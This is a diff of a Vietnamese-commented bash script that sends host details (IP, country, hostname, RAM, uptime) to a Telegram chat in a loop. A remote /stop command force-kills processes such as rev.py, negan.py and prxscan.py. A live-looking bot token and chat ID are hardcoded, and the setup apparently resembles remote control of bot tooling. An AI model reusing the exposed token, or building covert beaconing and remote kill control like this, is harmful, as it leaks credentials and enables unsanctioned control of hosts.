@@ -5,24 +5,53 @@ TELEGRAM_TOKEN="7828296793:AAEw4A7NI8tVrdrcR0TQZXyOpNSPbJmbGUU"
 CHAT_ID="7371969470"
 POLLING_INTERVAL=7
 
+# Biến flag để kiểm soát việc dừng polling
+STOP_POLLING=false
+
 # Hàm gửi tin nhắn qua Telegram
 send_telegram_message() {
     local message=$1
-    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+    local response=$(curl -s -w "%{http_code}" -o /dev/null -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
         -d chat_id="$CHAT_ID" \
         -d text="$message" \
-        -d parse_mode="HTML" > /dev/null
+        -d parse_mode="HTML")
+
+    if [[ "$response" -ne 200 ]]; then
+        echo "Lỗi khi gửi tin nhắn: Mã phản hồi $response"
+    fi
 }
 
 # Hàm bỏ qua toàn bộ lệnh trước đó
 ignore_previous_commands() {
     # Lấy update_id cuối cùng từ Telegram API
     local last_update_id=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates" | jq -r '.result[-1].update_id')
-    
+
     # Nếu có update_id, đặt offset lớn hơn last_update_id để bỏ qua tất cả lệnh trước đó
     if [[ -n "$last_update_id" && "$last_update_id" != "null" ]]; then
         curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((last_update_id + 1))&timeout=0" > /dev/null
     fi
+}
+
+# Hàm kill mạnh mẽ các tiến trình
+strong_kill() {
+    local processes=("rev.py" "negan.py" "prxscan.py" "start.sh" "monitor.sh" "setup.sh")
+    for process in "${processes[@]}"; do
+        pkill -9 -f "$process"
+        # Kiểm tra và kill các tiến trình con nếu có
+        pkill -9 -P $(pgrep -f "$process")
+    done
+
+    # Sử dụng killall để đảm bảo kill tất cả các tiến trình liên quan
+    killall -9 -q "${processes[@]}"
+
+    # Kiểm tra xem các tiến trình đã bị kill chưa
+    for process in "${processes[@]}"; do
+        if pgrep -f "$process" > /dev/null; then
+            send_telegram_message "Không thể kill tiến trình $process."
+        else
+            send_telegram_message "Đã kill tiến trình $process thành công."
+        fi
+    done
 }
 
 # Hàm kiểm tra lệnh từ Telegram
@@ -36,15 +65,13 @@ check_telegram_command() {
 
         # Kiểm tra nếu có lệnh /stop
         if echo "$updates" | grep -q "/stop"; then
-            send_telegram_message "Stopping monitoring."
-            pkill -f -9 "rev.py|negan.py|prxscan.py|start.sh|monitor.sh|setup.sh"
-            exit 1
+            send_telegram_message "Đang ngừng giám sát và dừng polling..."
+            STOP_POLLING=true
+            strong_kill
+            exit 0
         fi
     fi
 }
-
-
-
 
 # Hàm lấy thông tin hệ thống
 get_system_info() {
@@ -98,7 +125,7 @@ get_system_info() {
     local uptime=$(uptime -p | sed 's/up //')
 
     # Tạo thông điệp
-    local message="🖥 Hệ điều hành BOT FREE NEGAN_REV: $os_name
+    local message="🖥 Hệ điều hành BOT FREE NEGAN_REV ^^: $os_name
 📡 Hostname: $hostname
 🌐 IP: $ip_address (Quốc gia: $country)
 🏗 RAM: Tổng ${total_ram_gb}GB | Đã dùng ${formatted_used_ram_gb}GB (${ram_usage_percent}%) | Trống ${ram_free_percent}% |
@@ -117,6 +144,11 @@ ignore_previous_commands
 
 # Vòng lặp chính
 while true; do
+    if $STOP_POLLING; then
+        send_telegram_message "Đã dừng polling và thoát script."
+        exit 0
+    fi
+
     check_telegram_command
     system_info=$(get_system_info)
     send_telegram_message "$system_info"
